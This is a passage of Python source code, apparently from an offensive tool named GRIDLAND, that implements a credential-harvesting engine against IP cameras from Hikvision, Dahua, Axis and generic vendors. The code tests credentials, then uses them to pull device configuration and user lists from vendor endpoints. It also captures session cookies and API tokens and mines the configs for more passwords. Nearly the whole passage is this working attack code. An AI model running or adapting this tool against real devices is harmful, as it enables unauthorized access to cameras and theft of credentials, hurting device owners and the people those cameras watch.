                target_ip, target_port, service
            )
            
            # Phase 2: Intelligent Credential Testing
            valid_credentials = await self.testing_engine.test_credentials_comprehensive(
                target_ip, target_port, service, brand, intelligence
            )
            
            # Phase 3: Configuration Data Extraction
            config_data = await self._extract_configuration_data(
                target_ip, target_port, service, valid_credentials
            )
            
            # Phase 4: Session Token Capture
            session_tokens = await self._capture_session_tokens(
                target_ip, target_port, service, valid_credentials
            )
            
            # Phase 5: Additional Credential Discovery from Config
            additional_credentials = await self._discover_credentials_from_config(config_data)
            
            # Phase 6: Vulnerability Indicator Analysis
            vulnerability_indicators = await self._analyze_vulnerability_indicators(
                target_ip, target_port, valid_credentials, config_data
            )
            
            # Combine all discovered credentials
            all_credentials = valid_credentials + additional_credentials
            
            # Create comprehensive harvest result
            harvest = CredentialHarvest(
                target_ip=target_ip,
                valid_credentials=all_credentials,
                potential_credentials=[],  # Could add uncertain credentials here
                authentication_vectors=auth_vectors,
                configuration_data=config_data,
                session_tokens=session_tokens,
                vulnerability_indicators=vulnerability_indicators,
                harvest_metadata={
                    "harvest_duration": time.time() - self.harvest_stats["harvest_start_time"],
                    "harvest_stats": self.harvest_stats,
                    "target_service": service,
                    "target_brand": brand,
                    "intelligence_used": bool(intelligence),
                    "methodology": "comprehensive_credential_harvesting_v2"
                }
            )
            
            # Update statistics
            self.harvest_stats["targets_processed"] += 1
            self.harvest_stats["credentials_discovered"] += len(all_credentials)
            self.harvest_stats["configuration_data_extracted"] += len(config_data)
            self.harvest_stats["session_tokens_captured"] += len(session_tokens)
            
            logger.info(f"✅ Credential harvesting complete: {len(all_credentials)} credentials discovered")
            return harvest
            
        except Exception as e:
            logger.error(f"❌ Credential harvesting failed: {e}")
            raise
    
    async def _extract_configuration_data(self, target_ip: str, target_port: int,
                                         service: str, valid_credentials: List[CredentialPair]) -> Dict[str, any]:
        """Extract configuration data using discovered credentials"""
        config_data = {}
        
        if not valid_credentials:
            return config_data
        
        try:
            # Use the first valid credential for configuration extraction
            primary_cred = valid_credentials[0]
            
            # Camera-specific configuration endpoints
            config_endpoints = {
                "hikvision": [
                    "/ISAPI/System/deviceInfo",
                    "/ISAPI/System/configurationData",
                    "/ISAPI/Security/users",
                    "/ISAPI/Network/interfaces"
                ],
                "dahua": [
                    "/cgi-bin/configManager.cgi?action=getConfig&name=General",
                    "/cgi-bin/configManager.cgi?action=getConfig&name=Network",
                    "/cgi-bin/configManager.cgi?action=getConfig&name=Users"
                ],
                "axis": [
                    "/axis-cgi/param.cgi?action=list",
                    "/axis-cgi/usergroup.cgi",
                    "/axis-cgi/systeminfo.cgi"
                ],
                "generic": [
                    "/config.xml", "/config.ini", "/settings.xml",
                    "/admin/config", "/api/config", "/system/config"
                ]
            }
            
            # Determine brand and select appropriate endpoints
            brand = service.split("_")[0] if "_" in service else "generic"
            endpoints = config_endpoints.get(brand, config_endpoints["generic"])
            
            # Extract configuration from endpoints
            for endpoint in endpoints:
                try:
                    config = await self._fetch_config_endpoint(
                        target_ip, target_port, endpoint, primary_cred
                    )
                    if config:
                        config_data[endpoint] = config
                except Exception as e:
                    logger.debug(f"Config extraction failed for {endpoint}: {e}")
                    continue
                    
        except Exception as e:
            logger.debug(f"Configuration data extraction failed: {e}")
        
        return config_data
    
    async def _fetch_config_endpoint(self, target_ip: str, target_port: int,
                                   endpoint: str, credential: CredentialPair) -> Optional[Dict[str, any]]:
        """Fetch configuration data from specific endpoint"""
        try:
            protocol = "https" if target_port == 443 else "http"
            url = f"{protocol}://{target_ip}:{target_port}{endpoint}"
            
            # Create authentication header
            credentials = f"{credential.username}:{credential.password}"
            encoded_credentials = base64.b64encode(credentials.encode()).decode()
            
            headers = {
                "Authorization": f"Basic {encoded_credentials}",
                "User-Agent": "GRIDLAND-Config-Extractor/2.0"
            }
            
            timeout = aiohttp.ClientTimeout(total=10)
            connector = aiohttp.TCPConnector(ssl=False)
            
            async with aiohttp.ClientSession(timeout=timeout, connector=connector, headers=headers) as session:
                async with session.get(url) as response:
                    if response.status == 200:
                        content = await response.text()
                        
                        # Parse configuration based on content type
                        if endpoint.endswith('.xml') or '<' in content:
                            return {"type": "xml", "content": content}
                        elif endpoint.endswith('.ini') or '=' in content:
                            return {"type": "ini", "content": content}
                        elif endpoint.endswith('.json') or content.strip().startswith('{'):
                            return {"type": "json", "content": content}
                        else:
                            return {"type": "text", "content": content}
                    
        except Exception as e:
            logger.debug(f"Config endpoint fetch failed: {e}")
        
        return None
    
    async def _capture_session_tokens(self, target_ip: str, target_port: int,
                                    service: str, valid_credentials: List[CredentialPair]) -> List[Dict[str, any]]:
        """Capture session tokens and cookies"""
        session_tokens = []
        
        if not valid_credentials:
            return session_tokens
        
        try:
            for credential in valid_credentials:
                tokens = await self._extract_session_tokens_for_credential(
                    target_ip, target_port, credential
                )
                session_tokens.extend(tokens)
                
        except Exception as e:
            logger.debug(f"Session token capture failed: {e}")
        
        return session_tokens
    
    async def _extract_session_tokens_for_credential(self, target_ip: str, target_port: int,
                                                   credential: CredentialPair) -> List[Dict[str, any]]:
        """Extract session tokens for specific credential"""
        tokens = []
        
        try:
            protocol = "https" if target_port == 443 else "http"
            base_url = f"{protocol}://{target_ip}:{target_port}"
            
            # Create authentication
            credentials = f"{credential.username}:{credential.password}"
            encoded_credentials = base64.b64encode(credentials.encode()).decode()
            
            headers = {
                "Authorization": f"Basic {encoded_credentials}",
                "User-Agent": "GRIDLAND-Token-Extractor/2.0"
            }
            
            timeout = aiohttp.ClientTimeout(total=10)
            connector = aiohttp.TCPConnector(ssl=False)
            
            async with aiohttp.ClientSession(timeout=timeout, connector=connector, headers=headers) as session:
                # Test endpoints that might set session tokens
                token_endpoints = ["/", "/login", "/admin", "/api/auth", "/dashboard"]
                
                for endpoint in token_endpoints:
                    try:
                        url = f"{base_url}{endpoint}"
                        
                        async with session.get(url) as response:
                            if response.status == 200:
                                # Extract cookies
                                cookies = dict(response.cookies)
                                if cookies:
                                    token_data = {
                                        "type": "cookie",
                                        "endpoint": endpoint,
                                        "cookies": cookies,
                                        "credential": {
                                            "username": credential.username,
                                            "service": credential.service
                                        }
                                    }
                                    tokens.append(token_data)
                                
                                # Look for API tokens in response
                                content = await response.text()
                                api_tokens = self._extract_api_tokens_from_content(content)
                                for token in api_tokens:
                                    token_data = {
                                        "type": "api_token",
                                        "endpoint": endpoint,
                                        "token": token,
                                        "credential": {
                                            "username": credential.username,
                                            "service": credential.service
                                        }
                                    }
                                    tokens.append(token_data)
                                    
                    except Exception as e:
                        logger.debug(f"Token extraction failed for {endpoint}: {e}")
                        continue
                        
        except Exception as e:
            logger.debug(f"Session token extraction failed: {e}")
        
        return tokens
    
    def _extract_api_tokens_from_content(self, content: str) -> List[str]:
        """Extract API tokens from HTML/JSON content"""
        tokens = []
        
        # Common API token patterns
        token_patterns = [
            r'"token"\\s*:\\s*"([^"]+)"',
            r'"api_key"\\s*:\\s*"([^"]+)"',
            r'"access_token"\\s*:\\s*"([^"]+)"',
            r'"bearer_token"\\s*:\\s*"([^"]+)"',
            r'token[\\s=:]+([a-zA-Z0-9\\-_]+)',
            r'api[\\s_]?key[\\s=:]+([a-zA-Z0-9\\-_]+)'
        ]
        
        for pattern in token_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                if len(match) > 10:  # Reasonable token length
                    tokens.append(match)
        
        return tokens
    
    async def _discover_credentials_from_config(self, config_data: Dict[str, any]) -> List[CredentialPair]:
        """Discover additional credentials from extracted configuration data"""
        additional_credentials = []
        
        try:
            for endpoint, config in config_data.items():
                if isinstance(config, dict) and "content" in config:
                    content = config["content"]
                    
                    # Extract credentials from configuration content
                    extracted_creds = self.credential_generator._extract_credentials_from_text(content)
                    
                    for username, password in extracted_creds:
                        credential = CredentialPair(
                            username=username,
                            password=password,
                            service="extracted_from_config",
                            port=0,  # Unknown port
                            confidence=0.7,  # Lower confidence for extracted credentials
                            discovery_method="configuration_extraction",
                            authentication_type="unknown",
                            verification_status="unverified",
                            metadata={"source_endpoint": endpoint}
                        )
                        additional_credentials.append(credential)
                        
        except Exception as e:
            logger.debug(f"Credential discovery from config failed: {e}")
        
        return additional_credentials
    
    async def _analyze_vulnerability_indicators(self, target_ip: str, target_port: int,
                                              credentials: List[CredentialPair],
                                              config_data: Dict[str, any]) -> List[Dict[str, any]]:
        """Analyze for vulnerability indicators based on harvested data"""
        indicators = []
        
        try:
            # Indicator 1: Weak/Default Credentials
            weak_credentials = [cred for cred in credentials 
                              if cred.password in ["", "admin", "12345", "123456", "password"]]
            
            if weak_credentials:
                indicator = {
                    "type": "weak_credentials",
                    "severity": "high",
                    "count": len(weak_credentials),
                    "description": "Default or weak credentials discovered",
                    "credentials": [{"username": c.username, "password": c.password} 
                                  for c in weak_credentials]
                }
                indicators.append(indicator)
            
            # Indicator 2: Multiple Admin Accounts
            admin_accounts = [cred for cred in credentials if "admin" in cred.username.lower()]
            
            if len(admin_accounts) > 1:
                indicator = {
                    "type": "multiple_admin_accounts",
                    "severity": "medium",
                    "count": len(admin_accounts),
                    "description": "Multiple administrative accounts discovered",
                    "accounts": [c.username for c in admin_accounts]
                }
                indicators.append(indicator)
            
            # Indicator 3: Configuration Exposure
            sensitive_config = []
            for endpoint, config in config_data.items():
                if isinstance(config, dict) and "content" in config:
                    content = config["content"].lower()
                    if any(keyword in content for keyword in ["password", "key", "secret", "token"]):
                        sensitive_config.append(endpoint)
            
            if sensitive_config:
                indicator = {
                    "type": "configuration_exposure",
                    "severity": "medium",
                    "count": len(sensitive_config),
                    "description": "Sensitive configuration data exposed",
                    "endpoints": sensitive_config
                }
                indicators.append(indicator)
            
        except Exception as e:
            logger.debug(f"Vulnerability indicator analysis failed: {e}")
        
        return indicators


# Main interface function
async def harvest_credentials(target_ip: str, target_port: int, service: str,
                            brand: Optional[str] = None,
                            intelligence: Dict[str, any] = None) -> CredentialHarvest:
    """
    Main interface for comprehensive credential harvesting.
    
    Args:
        target_ip: Target IP address
        target_port: Target port
        service: Service type
        brand: Device brand (if known)
        intelligence: Additional intelligence data
    
    Returns:
        Comprehensive CredentialHarvest object
    """
    engine = CredentialHarvestingEngine()
    return await engine.harvest_credentials_comprehensive(
        target_ip, target_port, service, brand, intelligence
    )